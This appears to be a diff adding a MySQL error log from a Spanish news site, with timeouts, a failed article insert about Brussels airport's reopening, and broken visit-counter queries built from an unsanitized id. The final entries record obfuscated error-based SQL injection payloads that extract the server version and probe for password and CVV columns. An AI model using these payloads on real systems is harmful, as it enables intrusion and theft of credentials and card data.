@@ -1,0 +1,73 @@
+Time : 23:20:47
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 19:42:13
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 19:41:42
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 19:41:11
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 19:40:40
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 19:26:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 19:06:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 18:09:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 12:05:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=3259'
+
+Time : 11:27:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'esperanza' tras la tragedia que costó la vida a 32 personas el 22 de marzo en Z' at line 1
+Raw SQL : CALL insertar('mundo','','mundo2','Confirman reapertura de Aeropuerto de Bruselas para este domingo','avines.jpg','
+BRUSELAS.
+
+El aeropuerto de Bruselas, que fue objeto de uno de los dos atentados terroristas del pasado 22 de marzo, retomará mañana domingo parcialmente los vuelos de pasajeros, informó hoy el consejero delegado de la compañía gestora, Arnaud Feist, en una rueda de prensa.
+
+','','A partir de mañana, el aeropuerto de Bruselas debería estar parcialmente operativo", señaló Feist, quien dijo que esta pronta reapertura es una señal de 'esperanza' tras la tragedia que costó la vida a 32 personas el 22 de marzo en Zaventem y en el metro de Maelbeek en la capital belga.
+<p>
+Los tres primeros vuelos partirán a Faro, Atenas y Turín y serán operados por Brussels Airlines, el cliente más importante del Aeropuerto Internacional de Zaventem.
+<p>
+Feist señaló que Brussels Airport ha tomado de manera consciente la decisión de retomar las operaciones con una oferta inicial "limitada", que irá aumentando gradualmente.
+<p>
+El objetivo de la compañía es volver a la capacidad máxima antes de las vacaciones de verano, es decir "a finales de junio, principios de julio", explicó el consejero delegado del aeropuerto.
+<p>
+Feist explicó que el aeropuerto solo será accesible en coche o en taxi durante los primeros días y que otros métodos de transporte seguirán cuanto antes.
+<p>
+Todos los vehículos, ya sean privados o taxis, deben hacer uso del aparcamiento P2 y desde allí acceder a la infraestructura temporal del aeropuerto al lado del denominado conector.
+<p>
+Habrá un control aleatorio de los vehículos que se acerquen al aeropuerto, indicó por su parte un representante de la Policía.
+<p>
+Solo pasajeros desde el aparcamiento tendrán acceso al aeropuerto", indicó el máximo responsable del aeropuerto, donde serán instalados detectores de metal y de rayos X y escáneres a los que se tendrán que someter "todos los pasajeros" y del equipaje.
+<p>
+La policía efectuará un "precontrol" sistemático para controlar los pasajes de viaje y los documentos de identidad.
+<p>
+La facturación se efectuará en mostradores de las aerolíneas en una zona especial del conector, después los pasajeros pasarán a una construcción terminal donde se escaneará sus equipajes de mano, entre otras cosas, antes de pasar al área de embarque.','','','','','','','','')
+
+Time : 00:02:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25636f6e74726173656125)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:02:04
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2563767625)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:02:00
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 00:01:58
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
